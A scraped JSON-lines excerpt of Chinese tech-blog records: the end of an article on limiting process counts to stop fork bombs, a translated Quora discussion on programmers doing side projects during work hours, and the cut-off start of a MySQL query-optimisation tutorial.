class=\"crayon-sy\">(</span><span class=\"crayon-v\">kbytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-8\"><span class=\"crayon-e\">max </span><span class=\"crayon-e\">memory </span><span class=\"crayon-e\">size</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">kbytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unlimited</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-9\"><span class=\"crayon-e\">open </span><span class=\"crayon-e\">files</span><span class=\"crayon-h\">                      </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1024</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-10\"><span class=\"crayon-e\">pipe </span><span class=\"crayon-e\">size</span><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-11\"><span class=\"crayon-e\">POSIX </span><span class=\"crayon-e\">message </span><span class=\"crayon-e\">queues</span><span class=\"crayon-h\">     </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">q</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">819200</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-12\"><span class=\"crayon-v\">real</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">time </span><span class=\"crayon-e\">priority</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-13\"><span class=\"crayon-e\">stack </span><span class=\"crayon-e\">size</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">kbytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8192</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-14\"><span class=\"crayon-e\">cpu </span><span class=\"crayon-e\">time</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">seconds</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unlimited</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-15\"><span class=\"crayon-e\">max </span><span class=\"crayon-e\">user </span><span class=\"crayon-e\">processes</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">u</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7782</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-16\"><span class=\"crayon-e\">virtual </span><span class=\"crayon-e\">memory</span><span class=\"crayon-h\">          </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">kbytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unlimited</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-17\"><span class=\"crayon-e\">file </span><span class=\"crayon-e\">locks</span><span class=\"crayon-h\">                      </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unlimited</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n<p>可以看到，<code>-u</code>参数可以限制用户创建进程数，因此，我们可以使用<code>ulimit -u 20</code>来允许用户最多创建20个进程。这样就可以预防bomb炸弹。但这样是不彻底的，关闭终端后这个命令就失效了。我们可以通过修改<code>/etc/security/limits.conf</code>文件来进行更深层次的预防，在文件里添加如下一行（ubuntu需更换为你的用户名）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57494524632553646\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nubuntu - nproc 20</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57494524632553646-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57494524632553646-1\"><span class=\"crayon-v\">ubuntu</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nproc</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这样，退出后重新登录，就会发现最大进程数已经更改为20了，</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fg4b7acou5j20k008275m.jpg\"></p>\n<p>这个时候我们再次运行炸弹就不会报内存不足了，而是提示<code>-bash: fork: retry: No child processes</code>，说明Linux限制了炸弹创建进程。</p>\n<h3 id=\"chpik\">参考</h3>\n<p><a href=\"http://en.wikipedia.org/wiki/Fork_bomb\" target=\"_blank\">http://en.wikipedia.org/wiki/Fork_bomb</a></p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111319\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111319votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111319\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/large/7cc829d3gy1fg4b78x2izj20go083gog.jpg"], "fav_nums": 5, "comment_nums": 1, "create_date": "2017/05/31", "praise_nums": 1}
{"tags": "程序员,职场,兼职", "front_image_path": "full/698fbbe1e59a9cbdd4f3e50db401d977fb98d6cd.jpg", "title": "程序员在工作时间做私活，是否该开除？", "url_object_id": "e33ead7302f690890e7aa2c6cb191b4a", "url": "http://blog.jobbole.com/111145/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.quora.com/Should-I-fire-a-software-engineer-for-always-working-on-his-side-projects-during-office-hours\">Quora</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：有个创业公司的 CTO 和联合创始人在 Quora 发帖求助：</p>\n<blockquote><p><span class=\"token p\">我是一家创业公司的 CTO 和联合创始人，我刚刚发现一个软件工程师每天会占用 2-3 个小时的工作时间做私活。其他工程师们也向我抱怨，希望我能对此采取一些行动。我该怎么做？应该开除他吗？</span></p></blockquote>\n<p>下面是伯乐在线摘编了 3 个网友的分享。</p>\n<h3>Don Sevcik 的回复，3.4K 👍</h3>\n<p class=\"qtext_para\">作为一个软件工程师，同时也是一个臭名昭著的上班兼职族（daylighter），让我来回答一下这个问题吧。“上班兼职族”这个词最初是由 CNN 在 2009 年的一篇题为《<a href=\"http://www.cnn.com/2008/LIVING/worklife/09/24/lw.working.on.the.job/index.html?_s=PM%3ALIVING\">狡猾的上班兼职族冒着被开除的风险做兼职</a>》的文章中提到的。它写的是那些在全职工作期间做兼职的人。</p>\n<p class=\"qtext_para\">那么为什么你该听我的？如果上班兼职族是一个团体，那我就是这个团体的主席了。我上一本书的 1/4 都是在上班期间完成的。唯一的区别是，我没有你的员工做的那么明显。在白天工作当中，我的兼职是处于隐身模式。我在上班期间做兼职已经有 10 年了，虽然我不认识你的员工，但是我明白为什么他要在上班时间做兼职。其中的原因非常有趣。</p>\n<p class=\"qtext_para\">首先问问你自己，为什么你的员工会在上班时间做兼职？我已经知道答案了，但是我希望你能理解。假设我作为一名软件工程师给你工作，我知道，作为全职员工（FTE，full-time employee）：</p>\n<blockquote>\n<p class=\"qtext_para\">你和我签署了合同，其中声明，如果我的工作达标，基于杰出的工作成果，我会得到年度绩效考核，有升职加薪及奖金的可能性。我也签署了同样的合同，得知你会对超出“基本工资”的技能水平表示尊敬。</p>\n</blockquote>\n<p class=\"qtext_para\">现在，是什么让我开始做兼职了呢？为什么我突然就变坏了？这里面有一个过渡，而不是一夜之间就改变的。以下是发生的原因：</p>\n<blockquote>\n<p class=\"qtext_para\">在我职业生涯最初的十年，对于任何一份新工作，我都会很努力地工作一年。比起我的同行们，我完成了更多项目，我会承担额外的工作，我会自动化和简化很多过程从而让业务执行更加流畅。同行评议（peer review）也证实了我的表现。一年之后，到了合同约定的年度评审的时候了。</p>\n</blockquote>\n<p class=\"qtext_para\">哈，有意思的部分来了。听着，因为这关系到你们这些企业的老板或是中层管理人员。第一年年底，我的薪水涨幅和奖金只在温饱水平。或者说，由于公司的拖延，年度审查被“推迟”了。</p>\n<p class=\"qtext_para\">如果不是每位同事都有非常高效地工作和产出，那么我打败了大多数人。当问到为什么我的审核还不是优秀的时候，没人回答我。有时候是因为企业政治，有时候是因为管理层的懒散和不愿支付奖金，有时候是因为“我们希望你合群一点”和“遵守游戏规则吧”。</p>\n<p class=\"qtext_para\"><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffid9pg9vqj20on0ge170.jpg\" width=\"520\" height=\"346\"></p>\n<p class=\"qtext_para\">我发现，其他有高质量高效率产出的程序员在审核期间，也经历了和我同样的遭遇。</p>\n<p class=\"qtext_para\">所以，管理层和老板们，这种时候要注意了，你们违背了雇佣协议。我超额且超水平完成工作，但是一年到头，你们只付我和平均水平产出的软件工程师同样的薪水。你们只给了和其他人差不多的工资，却多得了 50% 甚至更多的产出。</p>\n<p class=\"qtext_para\">让我们说得更明白点：假设有两个软件工程师，一个在平均八小时的工作时间完成 4 个高难度的编程任务，另一个在平均八小时的工作时间完成 6 个高难度的编程任务。年底，你应该给第二个人更多钱作为加薪和奖金。第二个人在同样时长下多了 50% 的产出。</p>\n<p class=\"qtext_para\">如果你不多付钱，那么作为企业老板或是中层管理者，你已经违反了雇佣合同（还记得工作表现和奖金的部分吗？），很多老板和管理人员到了涨薪和发奖金的时候就得了健忘症。是不是很搞笑？</p>\n<p class=\"qtext_para\">用同样的例子，但是我们要用 4 个高难度任务，作为一个拿着 X 美元一年的工资的程序员每天被期待完成的平均工作量。张三用 8 个小时完成，李四 4 个小时完成。如果李四知道那些懒散的老板和管理者不会给他更多钱，在做兼职这件事上，李四会有怎样的动机呢？他知道雇佣合同已经被违背了。他也知道会出现几百个富有想象力的互相踢皮球的管理者出现，只为了不付他更多的钱。</p>\n<p class=\"qtext_para\">那么下一步他会做什么？如果聪明的话，他会无情地在工作时间做兼职。因为如果雇主不在意雇佣合同，为什么程序员要在意呢？看到我要做什么了吗？我要用这额外的四个小时为自己赚更多的钱。</p>\n<p class=\"qtext_para\">现在让我暂停一会儿，因为我知道老板们和懒散的中层管理者们正在读这篇答案。而且他们在说：“你应该承担更多的工作，以示你是一个有团队合作精神的人”。不，有团队合作精神的人正在码字呢：“做再多，也永远不会因此多赚一点”。</p>\n<p class=\"qtext_para\">有时候，你们这些标榜团队合作的中层管理者，却从来不会给团队精英多付 1-2% 的报酬，因此（所谓团队合作）也就毫无价值。</p>\n<p class=\"qtext_para\">还有一些管理者和老板说：“我看另外一个程序员做的更多，也没要求更多的钱。”那祝你好运，这个高效高产出的新程序员会意识到他额外的付出都是无用的，这只是时间问题。</p>\n<p class=\"qtext_para\">上班兼职族之美在于它回归到了最纯粹的精英主导（meritocracy）。我为客户服务，在截止日期前完成工作，其他人，也就是客户付钱给我。没有办公室政治，没有违背雇佣合同。我在工作中做兼职的每一个小时都直接转化为报酬。而我所得的报酬比你们这些管理者能给我的微不足道的奖金要多多了。</p>\n<p class=\"qtext_para\">上班兼职族是中层管理者们出于懒惰或贪婪而抛弃精英主导理念的副产物。我打赌现在中层管理者们正出来说：“为什么我要给一个程序员 20% 的涨薪？不管他们做了多少工作，那都太多了！”但还是同一拨管理者们，从来没有用钱来衡量过这些额外工作为公司带来了多少收益。</p>\n<p class=\"qtext_para\">所以再说一次，如果中层管理者和老板们太懒，不愿做作业，或者太懒而不愿尊重雇佣合同，那么我和其他像我一样的程序员会继续做兼职。</p>\n<p class=\"qtext_para\">别担心，管理者们，你们会得到上面提到的高产出的。你只是不会再得到更多东西了。如果你需要我那白天的最后几个小时，我会在我的办公桌等着，准备拥抱精英主义。</p>\n<p>想要更好的服务，那就请把小费/奖金放在我的罐子里吧。</p>\n<p> </p>\n<h3>Peter Szinek 的分享（他有 11 年自由开发经历）</h3>\n<p class=\"qtext_para\">我曾经就是你说的这样的人。</p>\n<p class=\"qtext_para\">我该被开除吗？可能吧，虽然并不是因为你认为的原因。</p>\n<p class=\"qtext_para\">我在一家朝九晚五的 Java 公司工作，对此我只有两个地方想抱怨：朝九晚五和 Java。</p>\n<p class=\"qtext_para\">不幸的是，我那时完全无法清楚地表达这一点：我刚从大学毕业，挣着很不错的工资，Java 还是一种处于白热化阶段的技术（没错，那是在上个世纪: )），这个领域很有趣，同事也不错……但是我知道什么地方出错了，我指不出是什么。</p>\n<p class=\"qtext_para\">我相信很多开发人员都有和我一样的处境，但是他们并不知道他们需要，或是有可能能做出彻底的改变。或者他们认为周围的一切都很好，问题只出在他们自己的想法之中。</p>\n<p class=\"qtext_para\">我属于第二类人：相信我所经历的所有困难是由于我内向的性格，不熟悉 J2EE 和相关的企业技术，以及超长的通勤时间等等。我所要做的就是拿出个男人的样子，搞定它们。</p>\n<p class=\"qtext_para\">随着时间流逝，情况并没有好转：但是我找到了一些止痛药：Python，后来是 Ruby 和写博客。写博客或是用 Ruby 黑一下 OSS 不仅减弱了我的痛苦，而且让我完全沉浸在做这些事的快乐中。</p>\n<p class=\"qtext_para\">我发现我有写作的诀窍。我的文章有好几次出现在 del.icio.us、dzone 和 reddit 的首页上——人们似乎很喜欢我写的 Ruby\\Rails 和 Web 2.0 （还记得吗，这是一个曾经很流行的词）的文章。</p>\n<p class=\"qtext_para\">一天，一个印度男联系到我，说想和我一起创办一个互联网创业公司——我负责所有和 web 应用开发相关的事情，而他负责业务发展/市场的部分。</p>\n<p class=\"qtext_para\">我立马就答应了，踏上了去印度班加罗尔的不可思议的旅途——我和当地人住在一起，每天工作 20 个小时，淹没在鲜艳的色彩，难以抗拒的美食和强烈的气味当中，印度的这一切是如此独特。但这是另一个故事了。</p>\n<p class=\"qtext_para\">你现在大概在想：老兄，你的故事很酷，但是你想表达什么？</p>\n<p class=\"qtext_para\">我想表达的是：经历了这些，我意识到，我生来就是一个数码游民，一个无休止的旅行者，一个靠自己的努力取得成功的人，一个企业家，一个创业思路的实践者。简而言之，我不是一个朝九晚五的程序员，从事着单一的企业应用的开发，偶尔有一两个星期的休假，其余时间都限制在一个小隔间里。</p>\n<blockquote>\n<p class=\"qtext_para\">伯乐在线补充：数码游民（digital nomad），利用基于互联网上的自由职业或者创业产生的收入来支持自己不受地点约束的生活和旅行）</p>\n</blockquote>\n<p class=\"qtext_para\">这就是他们本该开除我的原因——当时的我太与众不同了。如果说存在团队和员工不匹配，那……我这种情形已经可以进入 top 10 了。</p>\n<p class=\"qtext_para\"><b></b>我的工作做得足够好了——表现并不突出，但也没有很烂（不管有没有在业余创业）：我们那时候在用 SCRUM，我通常在发布之前完成任务，因此，表现不好并不足以成为开除我的理由。</p>\n<p class=\"qtext_para\">然而我的同事们注意到我就是有点……不一样。随着时间流逝，（我的行为）对团队的士气和凝聚力造成了伤害。所以有了在印度的那段经历以后，我决定离开，这是我人生中最正确的决定。从那以后，我成为了一个快乐的远程工作者。</p>\n<p class=\"qtext_para\"><b></b>现在我有了完全相反的问题：我如此享受我所做的工作，以至于我要强迫自己找时间陪家人或是休息。和我第一份工作中的经历完全相反。</p>\n<p class=\"qtext_para\"><span class=\"token p\">当然，这是我个人的经历，你的雇员的问题可能和我大不一样。</span></p>\n<p class=\"qtext_para\"><b></b>结论：<span style=\"color: #ff0000;\">你的员工有这样的行为的原因，对你的团队造成的影响，以及长期的后果都要看实际情况。你要知道这种雇佣关系能否很好地运作，或是其中是否有太多漏洞：他和同事，和管理层不协调，还是他只是不适合这个职位（见上述我的经历）等等。如果是这样，那么“说再见”符合双方的最大利益。</span></p>\n<p class=\"qtext_para\">我知道这听起来很难，尤其是对员工来说。但是开除不应该完全看做是不好的事，应该看做是双方的新开始，如果有必要（开除）就要采取行动。</p>\n<p class=\"qtext_para\">也可能这个问题值得解决（有时这种事平平无奇），这也是双赢。</p>\n<p class=\"qtext_para\">我所说的解决并不是说找到什么创新的办法来保证员工不再做兼职：那不叫解决办法，治标不治本，要深入问题的根本，而不是在表面修正这个问题。</p>\n<p class=\"qtext_para\">解决方案是互惠互利的，员工可以茁壮成长，为公司带来巨大价值。有时候解决办法只适用于组织以外（像我的那种特殊情况），但是经过一些调整，在组织的内部可能也行得通。</p>\n<p class=\"qtext_para\">不要因为问题难以解决就不去碰触，及时沟通，找到解决方案。不管问题看起来有多难，总会有办法的。</p>\n<p class=\"qtext_para\">祝你好运。</p>\n<p> </p>\n<h3>Barry Rountree 的分享，4.1K👍</h3>\n<p class=\"qtext_para\">从你的提问来看，你有一个每天只用五个小时就能完成所有任务的开发人员？</p>\n<p class=\"qtext_para\"><span class=\"token p\">你有没有想过给他升职？</span></p>\n<p class=\"qtext_para\"><span class=\"token p\">如果他的工作完成很及时且符合标准，你应该问问他是否做好了承担更多职责的准备。</span></p>\n<p class=\"qtext_para\"><span class=\"token p\">如果他的工作没做好，无论出于什么原因，都需要你介入其中。开除他是最后的选择。</span></p>\n<p class=\"qtext_para\"><span class=\"token p\">如果你不知道他的工作是不是做好了，那么你的管理有问题。</span></p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/07/acb658caeaa7401d5d7d20f28a1eab52.png\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111145\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111145votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111145\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">刘唱</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/5f17a18404975a50e3a341f2f8e27d59.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            数据挖掘研究生        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/liuchang\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/liuchang/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 33</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://www.jianshu.com/u/04b72e40cddc\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2577872237\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：learningDM\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/63918611gy1ffid9pg9vqj20on0ge170.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/05/12", "praise_nums": 2}
{"tags": "数据库,MySQL,IT技术", "front_image_path": "full/ed02bd36286ef5ec9f067bc8d381a46ca5124f1e.jpg", "title": "如何将 MySQL 查询速度提升 300 倍", "url_object_id": "f10a23033e04f5057cb5c1a2a6a48489", "url": "http://blog.jobbole.com/111129/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/17/5/speed-your-mysql-queries-300-times\">opensource</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/speed-your-mysql-queries-300-times?print\">开源中国</a>   </div><p>在进行性能分析前，需要先定位耗时查询。</p>\n<p>MySQL 提供了内建的耗时查询日志。使用前，打开 <strong>my.cnf </strong>文件，将<strong>slow_query_log </strong>设置为”On”。 同时将 <strong>long_query_time </strong>设置为一个对一次查询来说比较慢的时间（秒数），比如 0.2。<strong>slow_query_log_file </strong>设置为你想保存日志文件的路径。然后运行代码，执行时间超过设定上限的查询将会被记录到日志中。</p>\n<p>一旦定位这些烦人的查询，就可以探究慢的原因。MySQL提供了<strong>EXPLAIN</strong>关键字。可以与<strong>SELECT、</strong><strong>DELETE、</strong><strong>INSERT、</strong><strong>REPLACE、</strong><strong>UPDATE</strong>语句一起使用。只需要如下一样添加到查询开始处：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd575f0b1e558678855\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN SELECT picture.id, picture.title\r\n FROM picture\r\n LEFT JOIN album ON picture.album_id = album.id WHERE album.user_id = 1;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" 